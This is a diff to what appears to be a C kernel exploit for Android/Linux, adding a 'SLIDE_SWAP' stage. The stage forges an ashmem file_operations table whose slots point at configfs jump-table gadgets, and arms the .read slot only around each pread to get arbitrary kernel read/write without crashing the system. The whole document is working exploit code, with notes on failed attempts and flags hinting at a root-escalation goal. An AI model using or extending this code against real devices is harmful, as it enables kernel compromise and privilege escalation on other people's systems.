@@ -27,6 +27,10 @@ uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
 uintptr_t binwrite_target;
+/* 1 while the staged SLIDE_SWAP table is live (see put_fake_fops_table):
+ * configfs_read_once arms .read around each pread so system read()
+ * traffic never sees the configfs read JT. */
+int g_swap_staged;
 char ashmem_path[256] = "/dev/ashmem";
 
 /* 2-write support */
@@ -406,6 +410,7 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   uint64_t a_llseek = active_offsets ? active_offsets->off_noop_llseek : 0;
   uint64_t a_ash_llseek = active_offsets ? active_offsets->off_ashmem_llseek : 0;
   uint64_t a_ash_rditer = active_offsets ? active_offsets->off_ashmem_read_iter : 0;
+  int slide_swap_tbl = env_flag("MODE4_SLIDE_SWAP", 0);
 
   /*
    * CRITICAL (plateau cross): skb payload is memset 0x41. file_operations is
@@ -436,7 +441,18 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    */
   int clone_fops = env_flag("MODE4_CLONE_FOPS", 0);
   int clone_cfg = env_flag("MODE4_CLONE_CFG", 0);
-  if (clone_fops || clone_cfg) {
+  /*
+   * SLIDE_SWAP stage-1 table: bit-exact ashmem clone + ONLY .write armed.
+   * 5.10 vfs_read/vfs_write prefer .read/.write over _iter — with .read
+   * NULL, system read() traffic routes to the REAL read_iter (safe), and
+   * our pwrite hits .write = configfs_write JT. .read is armed only
+   * around each configfs_read_once (microseconds) via the write
+   * primitive (g_swap_staged). SS1/R2/W1 died to system reads hitting
+   * the configfs read JT through the .read slot.
+   */
+  int swap_stage1 = slide_swap_tbl;
+  g_swap_staged = swap_stage1;
+  if (clone_fops || clone_cfg || swap_stage1) {
     put64(p, off + FOPS_OWNER_OFF, 0);
     put64(p, off + FOPS_LLSEEK_OFF,
           runtime_text_sym(a_ash_llseek, a_llseek));
@@ -445,19 +461,27 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
     put64(p, off + FOPS_READ_OFF,
           clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF) : 0);
     put64(p, off + FOPS_WRITE_OFF,
-          clone_cfg ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
-                    : 0);
-    put64(p, off + FOPS_READ_ITER_OFF, 0);
+          (clone_cfg || swap_stage1)
+              ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
+              : 0);
+    put64(p, off + FOPS_READ_ITER_OFF,
+          (swap_stage1 && a_ash_rditer)
+              ? runtime_text_sym(a_ash_rditer, 0)
+              : 0);
     put64(p, off + FOPS_WRITE_ITER_OFF, 0);
 #else
     put64(p, off + FOPS_READ_OFF, 0);
     put64(p, off + FOPS_WRITE_OFF, 0);
     put64(p, off + FOPS_READ_ITER_OFF,
-          clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
-                    : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0));
+          swap_stage1 && a_ash_rditer
+              ? runtime_text_sym(a_ash_rditer, 0)
+              : (clone_cfg ? runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF)
+                           : (a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0)
+                                           : 0)));
     put64(p, off + FOPS_WRITE_ITER_OFF,
-          clone_cfg ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
-                    : 0);
+          (clone_cfg || swap_stage1)
+              ? runtime_text_sym(a_cfg_w, CONFIGFS_BIN_WRITE_ITER_OFF)
+              : 0);
 #endif
     put64(p, off + FOPS_IOCTL_OFF,
           runtime_text_sym(a_ioctl, ASHMEM_IOCTL_OFF));
@@ -502,7 +526,6 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    * -> try_module_get((struct module*)1) faults instantly (SS1 + R2
    * both died at first open regardless of slide; owner=0 is the fix).
    */
-  int slide_swap_tbl = env_flag("MODE4_SLIDE_SWAP", 0);
   int rb_leaf = (env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
                 env_flag("MODE4_ION_ROOT", 0) ||
@@ -2179,6 +2202,35 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   return wr;
 }
 
+/* Stage-2 arm/disarm of the .read slot on the staged swap table: .read
+ * = configfs read JT only for the duration of OUR pread. While disarmed,
+ * system read() traffic falls through .read=NULL to the real read_iter. */
+static int swap_arm_read_slot(int fd) {
+  uint64_t a_cfg_r = active_offsets ? active_offsets->off_configfs_read_iter
+                                    : 0;
+  uint64_t cfg_r = runtime_text_sym(a_cfg_r, CONFIGFS_READ_ITER_OFF);
+  uint64_t zero = 0;
+  if (configfs_write_once(fd, fake_fops + FOPS_READ_OFF, &cfg_r,
+                          sizeof(cfg_r)) != (ssize_t)sizeof(cfg_r))
+    return 0;
+  if (configfs_write_once(fd, fake_fops + FOPS_READ_ITER_OFF, &zero,
+                          sizeof(zero)) != (ssize_t)sizeof(zero))
+    return 0;
+  return 1;
+}
+
+static void swap_disarm_read_slot(int fd) {
+  uint64_t zero = 0;
+  uint64_t a_ash_rditer = active_offsets ? active_offsets->off_ashmem_read_iter
+                                         : 0;
+  uint64_t real_rditer =
+      a_ash_rditer ? runtime_text_sym(a_ash_rditer, 0) : 0;
+  configfs_write_once(fd, fake_fops + FOPS_READ_OFF, &zero, sizeof(zero));
+  if (real_rditer)
+    configfs_write_once(fd, fake_fops + FOPS_READ_ITER_OFF, &real_rditer,
+                        sizeof(real_rditer));
+}
+
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
@@ -2214,7 +2266,15 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   }
 
   errno = 0;
+  int armed = 0;
+  if (g_swap_staged)
+    armed = swap_arm_read_slot(fd);
+  errno = 0;
   ssize_t rd = pread(fd, data, len, pos);
+  int rd_errno = errno;
+  if (armed)
+    swap_disarm_read_slot(fd);
+  errno = rd_errno;
   return rd;
 }
 
